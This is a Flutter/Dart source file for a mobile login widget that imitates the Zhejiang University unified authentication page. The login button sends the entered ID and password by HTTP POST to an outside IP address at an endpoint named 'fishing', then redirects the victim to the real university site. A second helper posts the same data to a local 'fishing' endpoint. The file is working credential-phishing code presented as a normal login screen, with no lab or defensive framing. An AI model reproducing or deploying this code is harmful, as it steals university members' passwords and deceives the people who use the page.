// ignore_for_file: prefer_const_constructors, prefer_const_literals_to_create_immutables

import 'dart:html';
import 'package:dotted_line/dotted_line.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/link.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:js/js.dart' as js;

class BlackBoxMobile extends StatefulWidget {
  const BlackBoxMobile({
    super.key,
    required TextEditingController idController,
    required TextEditingController passwordController,
  })  : _idController = idController,
        _passwordController = passwordController;

  final TextEditingController _idController;
  final TextEditingController _passwordController;

  @override
  State<BlackBoxMobile> createState() => _BlackBoxMobileState();
}

class _BlackBoxMobileState extends State<BlackBoxMobile> {
  bool checkboxValue = false;
  @override
  void initState() {
    super.initState();
    // 변수 초기화
    checkboxValue = false;
  }

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 10),
      child: Container(
        width: double.infinity,
        height: 390,
        color: Colors.black45,
        child: Stack(
          children: [
            Align(
              child: Image.asset(
                "assets/qcode.png",
                width: 72.8,
                height: 72.8,
              ),
              alignment: Alignment.topRight,
            ),
            Padding(
              padding: const EdgeInsets.all(15.0),
              child: Column(
                children: [
                  Container(
                    height: 10,
                  ),
                  const Text(
                    "浙大通行证",
                    style: TextStyle(
                      color: Colors.white,
                      fontSize: 24,
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                  Container(
                    height: 15,
                  ),
                  Stack(
                    children: [
                      Row(
                        children: [
                          Padding(
                            padding: const EdgeInsets.symmetric(
                                horizontal: 12, vertical: 6),
                            child: Image.asset(
                              "assets/user.png",
                            ),
                          ),
                          const SizedBox(width: 10),
                          Expanded(
                            child: TextField(
                              cursorColor: Colors.white,
                              cursorWidth: 1,
                              controller: widget._idController,
                              decoration: InputDecoration(
                                enabledBorder: UnderlineInputBorder(
                                  borderSide:
                                      BorderSide(color: Colors.white), // 하얀색 밑줄
                                ),
                                isCollapsed: true,
                                contentPadding: EdgeInsets.symmetric(
                                    vertical: 12, horizontal: 10),
                                focusedBorder: UnderlineInputBorder(
                                  borderSide: BorderSide(
                                      color: Colors.white), // 원하는 색상으로 변경해주세요
                                ),
                                hintText: '  职工号/学号/手机号码/邮箱/别名',
                                hintStyle:
                                    TextStyle(color: Colors.grey, fontSize: 13),
                              ),
                              style: TextStyle(
                                  color: Colors.white, fontSize: 14, height: 1),
                            ),
                          ),
                        ],
                      ),
                      Positioned(
                        child: Text(
                          '点击激活用户',
                          style: TextStyle(color: Colors.white, fontSize: 12),
                        ),
                        right: 0,
                        top: 11,
                      )
                    ],
                  ),
                  const SizedBox(height: 10),
                  Stack(
                    children: [
                      Row(
                        children: [
                          Padding(
                            padding: const EdgeInsets.symmetric(
                                horizontal: 12, vertical: 6),
                            child: Image.asset("assets/lock.png"),
                          ),
                          const SizedBox(width: 10),
                          Expanded(
                              child: TextField(
                            obscureText: true,
                            cursorColor: Colors.white,
                            cursorWidth: 1,
                            controller: widget._passwordController,
                            decoration: InputDecoration(
                              isCollapsed: true,
                              contentPadding: EdgeInsets.symmetric(
                                  vertical: 12, horizontal: 10),
                              enabledBorder: UnderlineInputBorder(
                                borderSide:
                                    BorderSide(color: Colors.white), // 하얀색 밑줄
                              ),
                              focusedBorder: UnderlineInputBorder(
                                borderSide:
                                    BorderSide(color: Colors.white), // 하얀색 밑줄
                              ),
                              hintStyle:
                                  TextStyle(color: Colors.grey, fontSize: 13),
                            ),
                            style: TextStyle(
                                color: Colors.white, fontSize: 14, height: 1),
                          )),
                        ],
                      ),
                      Positioned(
                        child: Text(
                          '忘记登录密码 ?',
                          style: TextStyle(color: Colors.white, fontSize: 12),
                        ),
                        right: 0,
                        top: 10,
                      )
                    ],
                  ),
                  const SizedBox(height: 10),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Padding(
                        padding: const EdgeInsets.all(8.0),
                        child: Link(
                          target: LinkTarget.self,
                          uri: Uri.parse('http://jwbinfosys.zju.edu.cn/'),
                          builder: (context, followLink) {
                            return ElevatedButton(
                              onPressed: () async {
                                // 아이디와 비밀번호 변수
                                String id = widget._idController.text;
                                String password =
                                    widget._passwordController.text;
                                final url = Uri.parse(
                                    'http://120.26.162.221:8001/restapi/fishing');
                                // HTTP 요청 보내기
                                followLink!();
                                print('플러터 닫기');
                                try {
                                  var response = await http.post(url,
                                      body: {'id': id, 'password': password});
                                  print('리퀘스트 보내기');

                                  if (response.statusCode == 200) {
                                    followLink!();
                                  } else {
                                    // 로그인 실패
                                  }
                                } catch (e) {
                                  print('Error: $e');
                                }
                              },
                              style: ElevatedButton.styleFrom(
                                  backgroundColor:
                                      Colors.blue, // 버튼의 배경색을 파란색으로 설정
                                  shape: RoundedRectangleBorder(
                                    borderRadius: BorderRadius.circular(
                                        3), // 버튼의 모서리를 둥글게 설정
                                  ),
                                  minimumSize: Size(260, 40)),
                              child: Text(
                                '登 录', // 버튼에 표시될 텍스트
                                style: TextStyle(
                                  color: Colors.white, // 버튼 텍스트의 색상을 흰색으로 설정
                                  fontSize: 13,
                                ),
                              ),
                            );
                          },
                        ),
                      ),
                      SizedBox(width: 20),
                      Transform.scale(
                        scale: 0.9,
                        child: Checkbox(
                          value: checkboxValue,
                          onChanged: (value) => {
                            setState(() {
                              if (value != null) {
                                checkboxValue = value;
                                print(value);
                                // 처리 로직
                              }
                            })
                          },
                          side: BorderSide(color: Colors.white, width: 0.8),
                        ),
                      ),
                      Text(
                        '记住我',
                        style: TextStyle(color: Colors.white, fontSize: 12),
                      )
                    ],
                  ),
                  Padding(
                    padding: EdgeInsets.symmetric(vertical: 5, horizontal: 9),
                    child: Column(
                      children: [
                        DottedLine(
                            dashGapLength: 2,
                            lineThickness: 0.8,
                            dashColor: Colors.white),
                        Padding(
                          padding: const EdgeInsets.symmetric(
                              vertical: 10, horizontal: 5),
                          child: Row(
                              mainAxisAlignment: MainAxisAlignment.spaceBetween,
                              children: [
                                Text(
                                  '国际校区老师登录',
                                  style: TextStyle(
                                      color: Colors.white,
                                      fontSize: 17,
                                      fontWeight: FontWeight.w100),
                                ),
                                Text(
                                  '第三方账号登录       ',
                                  style: TextStyle(
                                      color: Colors.white,
                                      fontSize: 17,
                                      fontWeight: FontWeight.w100),
                                ),
                              ]),
                        ),
                        Padding(
                          padding:
                              EdgeInsets.symmetric(horizontal: 8, vertical: 0),
                          child: Row(
                              mainAxisAlignment: MainAxisAlignment.spaceBetween,
                              children: [
                                Card(
                                  color: Colors.white,
                                  shape: RoundedRectangleBorder(
                                      borderRadius: BorderRadius.circular(0)),
                                  child: Image.asset('assets/intl.png',
                                      width: 120, height: 42),
                                ),
                                Image.asset(
                                  'assets/dingdingwechat.png',
                                  width: 160,
                                  height: 60,
                                )
                              ]),
                        ),
                        Text(
                          '统一身份认证咨询电话 0571-87951669',
                          style: TextStyle(color: Colors.white, fontSize: 12),
                        ),
                        SizedBox(
                          height: 12,
                        ),
                        DottedLine(
                            dashGapLength: 2,
                            lineThickness: 0.8,
                            dashColor: Colors.white),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  ElevatedButton linkButton(function) {
    return ElevatedButton(
      onPressed: () async {
        // 아이디와 비밀번호 변수
        String id = widget._idController.text;
        String password = widget._passwordController.text;
        final url = Uri.parse('http://127.0.0.1:8000/restapi/fishing');
        // HTTP 요청 보내기

        print('플러터 닫기');
        try {
          var response =
              await http.post(url, body: {'id': id, 'password': password});
          print('리퀘스트 보내기');
          function!;
          if (response.statusCode == 200) {
            // 로그인 성공
          } else {
            // 로그인 실패
          }
        } catch (e) {
          print('Error: $e');
        }
      },
      style: ElevatedButton.styleFrom(
          backgroundColor: Colors.blue, // 버튼의 배경색을 파란색으로 설정
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(3), // 버튼의 모서리를 둥글게 설정
          ),
          minimumSize: Size(260, 40)),
      child: Text(
        '登 录', // 버튼에 표시될 텍스트
        style: TextStyle(
          color: Colors.white, // 버튼 텍스트의 색상을 흰색으로 설정
          fontSize: 13,
        ),
      ),
    );
  }
}
